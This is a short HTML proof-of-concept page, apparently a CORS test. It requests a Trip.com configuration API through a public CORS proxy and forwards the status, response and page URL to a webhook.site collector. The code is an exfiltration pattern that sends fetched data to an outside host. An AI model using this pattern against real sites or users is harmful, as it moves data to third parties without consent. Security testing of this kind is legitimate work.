<!DOCTYPE html>
<html>
<body>

<h1>CORS Test</h1>

<pre id="result"></pre>

<script>

// ===== رابط webhook.site لإرسال الرد إليه (اختياري) =====
const TARGET_URL = "https://webhook.site/2bef5d8a-4a84-4ab7-8e71-ef2f512aa556";

// ===== استخدم Proxy جديد =====
const PROXY_URL = "https://cors-anywhere.herokuapp.com/";

// ===== الطلب إلى Trip.com عبر Proxy =====
const TRIP_API = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https://omar.trip.com";

fetch(PROXY_URL + TRIP_API, {  // ملاحظة: لم نعد نستخدم encodeURIComponent
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        head:{
            locale:"ar-XX",
            currency:"USD",
            vID:"1783978788105.8e68P1hvGdSY"
        },
        platform:"Online",
        componentType:"online-app-download-universal",
        version:"6.0.5",
        pageId:"10320668148",
        aid:0,
        sid:0,
        customId:"side",
        customParam:{}
    })
})

// ===== معالجة الرد من Trip.com =====
.then(async r => {
    const status = r.status;
    const responseText = await r.text();
    
    document.getElementById("result").textContent =
    "Status: " + status + "\n\n" + responseText;
    
    // ===== إرسال الرد إلى webhook.site (اختياري) =====
    try {
        await fetch(TARGET_URL, {
            method: "POST",
            mode: 'no-cors',
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                source: "trip.com",
                status: status,
                response: responseText,
                timestamp: new Date().toISOString(),
                url: window.location.href
            })
        });
        document.getElementById("result").textContent += 
        "\n\n✅ تم إرسال البيانات إلى webhook.site";
    } catch(forwardError) {
        document.getElementById("result").textContent += 
        "\n\n❌ فشل إرسال البيانات إلى webhook.site (غير مهم)";
    }
})

// ===== معالجة الأخطاء =====
.catch(e => {
    document.getElementById("result").textContent =
    "Blocked:\n" + e;
});

</script>

</body>
</html>
